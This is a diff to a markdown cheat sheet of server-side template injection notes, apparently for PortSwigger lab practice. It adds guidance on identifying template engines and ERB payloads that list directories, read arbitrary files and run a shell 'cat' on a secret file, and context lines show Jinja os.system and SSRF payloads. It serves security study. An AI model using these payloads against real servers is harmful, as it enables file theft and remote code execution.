@@ -2054,7 +2054,7 @@ stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2
 [ERB](#erb)  
 [Handlebars](#handlebars)  
 
->Use the web framework native template syntax to inject a malicious payload into a **{{input}}**, which is then executed server-side.  
+>Use the web framework native template syntax to inject a malicious payload into a **{{input}}**, which is then executed server-side. Submitting invalid syntax will often result in error message that lead to ***identifying*** the template framework. Use PortSwigger [template decision tree](https://portswigger.net/web-security/images/template-decision-tree.png) to aid in ***identification***.  
 
 ### SSTI Identified  
 
@@ -2119,7 +2119,7 @@ blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/
 
 ### Django  
 
->Django Template  
+>Django Template uses ```debug``` tag to display debugging information.  
 
 ```
 ${{<%[%'"}}%\,
@@ -2146,15 +2146,22 @@ ${foobar}
 
 ### ERB  
 
->ERB Template  
-
+>Identify ERB template.  
 ```
 <%= 7*7 %>
-<%= system("cat /home/carlos/secret") %>
 ```  
 
-![ERB template](images/erb-template.png)  
+>ERB Template documentation reveals that you can list all directories and then read arbitrary files as follows:  
 
+```erb
+<%= Dir.entries('/') %>
+<%= File.open('/example/arbitrary-file').read %>
+
+<%= system("cat /home/carlos/secret") %>
+```
+
+![ERB template](images/erb-template.png)  
+  
 [PortSwigger Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)  
 
 ### Handlebars  
